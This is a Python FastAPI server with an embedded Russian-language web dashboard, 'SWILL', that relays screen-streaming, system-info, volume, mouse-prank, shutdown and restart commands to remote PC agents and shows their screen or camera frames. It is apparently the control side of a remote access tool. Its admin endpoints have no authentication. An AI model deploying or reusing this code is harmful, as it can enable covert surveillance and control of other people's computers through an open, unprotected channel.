import os
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from typing import Dict, Set

app = FastAPI()

# Хранилища активных соединений
# { "device_id": WebSocket }
active_agents: Dict[str, WebSocket] = {}
# Подключенные администраторы (веб-интерфейсы)
active_admins: Set[WebSocket] = set()

# Базовый HTML-шаблон панели управления (встроен прямо в код для удобства деплоя)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>SWILL Control Panel</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #fff; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; padding-bottom: 20px; }
        .device-selector { padding: 10px; background: #2a2a2a; color: #fff; border: 1px solid #444; border-radius: 5px; font-size: 16px; }
        .main-grid { display: grid; grid-template-columns: 300px 1fr; gap: 20px; margin-top: 20px; }
        .panel { background: #222; border: 1px solid #333; border-radius: 8px; padding: 15px; }
        .btn { display: block; width: 100%; padding: 10px; margin: 8px 0; background: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer; text-align: left; font-weight: bold; }
        .btn:hover { background: #0056b3; }
        .btn-danger { background: #dc3545; }
        .btn-danger:hover { background: #bd2130; }
        .console { background: #000; border: 1px solid #333; height: 150px; overflow-y: auto; padding: 10px; font-family: monospace; font-size: 12px; color: #00ff00; border-radius: 5px; margin-top: 15px; }
        #screen-viewer { width: 100%; max-height: 500px; border: 2px solid #444; background: #000; border-radius: 5px; object-fit: contain; }
        .status-badge { display: inline-block; width: 12px; height: 12px; border-radius: 50%; background: #dc3545; margin-right: 8px; }
        .status-online { background: #28a745; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>SWILL Web Console</h1>
            <div>
                <span id="status-light" class="status-badge"></span>
                <select id="device-select" class="device-selector" onchange="connectToDevice()">
                    <option value="">-- Выберите устройство --</option>
                </select>
            </div>
        </header>

        <div class="main-grid">
            <div class="panel">
                <h3>Управление ПК</h3>
                <button class="btn" onclick="sendCommand('screen_on')">▶ Включить Стрим Экрана</button>
                <button class="btn" onclick="sendCommand('screen_off')">⏸ Остановить Стрим</button>
                <button class="btn" onclick="sendCommand('pc_info')">💻 Информация о системе</button>
                <button class="btn" onclick="sendCommand('volume_max')">🔊 Громкость 100%</button>
                <button class="btn" onclick="sendCommand('volume_min')">🔇 Выключить звук</button>
                <button class="btn" onclick="sendCommand('crazy_mouse')">🐭 Сумасшедшая мышь</button>
                
                <h3 style="margin-top:20px;">Опасные действия</h3>
                <button class="btn btn-danger" onclick="sendCommand('shutdown')">🔌 Выключить ПК</button>
                <button class="btn btn-danger" onclick="sendCommand('restart')">🔄 Перезагрузка</button>
            </div>

            <div class="panel">
                <h3>Трансляция (Live Screen / Camera)</h3>
                <img id="screen-viewer" src="" alt="Ожидание изображения с устройства...">
                
                <h3>Вывод терминала</h3>
                <div id="log-console" class="console">Система готова. Ожидание выбора устройства...</div>
            </div>
        </div>
    </div>

    <script>
        let wsAdmin = null;
        let selectedDevice = "";

        // Поиск активных устройств (запрос к API сервера)
        async function updateDeviceList() {
            try {
                let response = await fetch('/api/devices');
                let devices = await response.json();
                let select = document.getElementById('device-select');
                
                // Сохраняем текущий выбор
                let currentVal = select.value;
                select.innerHTML = '<option value="">-- Выберите устройство --</option>';
                
                devices.forEach(dev => {
                    let opt = document.createElement('option');
                    opt.value = dev;
                    opt.innerHTML = dev;
                    if(dev === currentVal) opt.selected = true;
                    select.appendChild(opt);
                });
            } catch (e) {
                console.error("Ошибка обновления списка устройств:", e);
            }
        }

        // Подключение к WebSocket выбранного устройства
        function connectToDevice() {
            selectedDevice = document.getElementById('device-select').value;
            if (!selectedDevice) {
                document.getElementById('status-light').className = "status-badge";
                return;
            }

            if (wsAdmin) wsAdmin.close();

            let protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
            wsAdmin = new WebSocket(`${protocol}//${window.location.host}/ws/admin/${selectedDevice}`);
            
            wsAdmin.onopen = () => {
                document.getElementById('status-light').className = "status-badge status-online";
                logConsole(`Подключено к управлению устройством: ${selectedDevice}`);
            };

            wsAdmin.onmessage = (event) => {
                if (typeof event.data === "string") {
                    // Обработка текстовых данных от ПК (логи, инфо)
                    try {
                        let data = JSON.parse(event.data);
                        if (data.type === "log") {
                            logConsole(data.payload);
                        }
                    } catch(e) {
                        logConsole("Получено: " + event.data);
                    }
                } else {
                    // Обработка бинарных данных (кадры экрана)
                    let blob = event.data;
                    let url = URL.createObjectURL(blob);
                    let viewer = document.getElementById('screen-viewer');
                    
                    // Освобождаем старую память перед установкой новой картинки
                    if (viewer.src) URL.revokeObjectURL(viewer.src);
                    viewer.src = url;
                }
            };

            wsAdmin.onclose = () => {
                document.getElementById('status-light').className = "status-badge";
                logConsole("Соединение с устройством потеряно.");
            };
        }

        function sendCommand(action) {
            if (!wsAdmin || wsAdmin.readyState !== WebSocket.OPEN) {
                alert("Выберите активное устройство и дождитесь соединения!");
                return;
            }
            wsAdmin.send(JSON.stringify({ "command": action }));
            logConsole(`Отправлена команда: [${action}]`);
        }

        function logConsole(text) {
            let consoleDiv = document.getElementById('log-console');
            consoleDiv.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${text}`;
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
        }

        // Регулярное обновление списка девайсов каждые 5 секунд
        setInterval(updateDeviceList, 5000);
        updateDeviceList();
    </script>
</body>
</html>
"""

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    return HTMLResponse(content=HTML_TEMPLATE)

@app.get("/api/devices")
async def get_devices():
    # Отдаем список ID всех подключенных на данный момент ПК
    return list(active_agents.keys())

@app.get("/ping")
async def ping():
    # Роут Keep-Alive для автопингера
    return {"status": "alive"}

# Эндпоинт для подключения агента с ПК
@app.websocket("/ws/agent/{device_id}")
async def agent_endpoint(websocket: WebSocket, device_id: str):
    await websocket.accept()
    active_agents[device_id] = websocket
    print(f"[+] Агент {device_id} успешно подключен к панели.")
    
    try:
        while True:
            # Принимаем данные от Агента (скриншоты или текст)
            data = await websocket.receive()
            
            # Если это бинарные данные (видео-кадр), пересылаем админам
            if "bytes" in data:
                for admin in active_admins:
                    await admin.send_bytes(data["bytes"])
            # Если текст (системная информация, логи выполнения)
            elif "text" in data:
                for admin in active_admins:
                    await admin.send_text(data["text"])
                    
    except WebSocketDisconnect:
        print(f"[-] Агент {device_id} разорвал соединение.")
    finally:
        if device_id in active_agents:
            del active_agents[device_id]

# Эндпоинт для подключения сессии администратора (Web UI)
@app.websocket("/ws/admin/{device_id}")
async def admin_endpoint(websocket: WebSocket, device_id: str):
    await websocket.accept()
    active_admins.add(websocket)
    
    try:
        while True:
            # Принимаем команду из браузера администратора
            data = await websocket.receive_json()
            
            # Пересылаем команду целевому агенту
            if device_id in active_agents:
                await active_agents[device_id].send_json(data)
                
    except WebSocketDisconnect:
        pass
    finally:
        active_admins.remove(websocket)

if __name__ == "__main__":
    import uvicorn
    # Порт задается динамически для совместимости с Render
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)